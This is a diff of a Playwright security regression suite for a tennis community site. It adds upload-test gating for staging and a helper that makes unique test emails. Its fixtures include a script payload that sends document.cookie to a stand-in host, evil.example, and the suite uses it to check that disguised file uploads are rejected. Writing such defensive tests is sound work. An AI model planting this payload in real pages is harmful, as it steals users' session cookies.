@@ -1,6 +1,8 @@
 import { test, expect } from '@playwright/test';
 import { registerPlayer, registerCoach } from '../helpers/auth';
 import { completePlayerProfile, completeCoachProfile } from '../helpers/profile';
+import { uniqueTestEmail } from '../fixtures/test-users';
+import { skipUnlessUploadsAllowed } from '../helpers/staging-gates';
 
 /*
   Security regression suite - not "does the feature work", but "does
@@ -214,6 +216,8 @@ test.describe('Security: malicious file upload rejection', () => {
   const disguisedHtmlPayload = Buffer.from('<script>document.location="https://evil.example/steal?c="+document.cookie</script>');
 
   test('@smoke SEC-007 Marketplace photo upload rejects a disguised non-image file', async ({ page }) => {
+    // Uploads write to Supabase Storage: off on Staging until isolation is verified.
+    skipUnlessUploadsAllowed();
     await registerPlayer(page);
     const itemRes = await page.request.post('/api/profile/marketplace', {
       data: { title: `Upload test item ${Date.now()}`, price: '10', condition: 'Used', location: 'Sydney, NSW' },
@@ -229,6 +233,8 @@ test.describe('Security: malicious file upload rejection', () => {
   });
 
   test('SEC-008 Tournament history photo upload rejects a disguised non-image file', async ({ page }) => {
+    // Uploads write to Supabase Storage: off on Staging until isolation is verified.
+    skipUnlessUploadsAllowed();
     await registerPlayer(page);
     const entryRes = await page.request.post('/api/profile/tournament-history', {
       data: { name: `Upload test tournament ${Date.now()}`, location: 'Sydney, NSW', date: '2026-01-01' },
@@ -291,7 +297,7 @@ test.describe('Security: stored XSS is neutralised on render', () => {
 
 test.describe('Security: registration does not leak whether an email is already taken', () => {
   test('@smoke SEC-009 Registering with an already-used email gets the exact same response as a real new signup', async ({ page }) => {
-    const email = `sec009_${Date.now()}@tennisconnect.test`;
+    const email = uniqueTestEmail('sec009');
     const payload = { email, password: 'Test123456!', name: 'Sec Test', role: 'player' };
 
     const firstRes = await page.request.post('/api/auth/register', { data: payload });
